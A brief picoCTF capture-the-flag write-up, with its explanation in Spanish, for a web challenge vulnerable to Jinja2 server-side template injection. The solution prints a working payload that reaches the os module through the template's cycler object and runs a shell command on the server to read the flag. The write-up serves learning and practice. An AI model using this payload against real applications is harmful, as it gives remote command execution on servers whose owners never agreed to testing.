## Description

I made a cool website where you can announce whatever you want! Try it out!I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:57534/)!

## Hint

1. Server Side Template Injection

## Solution

```
{{self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}


Este es un exploit típico. Es una expresión típica de Jinja2, lo que se tenga dentro, si se tiene una inyección, se ejecuta en el servidor.

Se acceden a variables internas del motor de plantillas, es una manera de bypassear restricciones para acceder al contexto completo del template.

Con el objecto cycler, se navega hasta los globals del entrono del template, la cual da acceso a módulos como os.

Se ejcuta el comando del sistema cat flag, mostrando el contenido del archivo flag. 

```



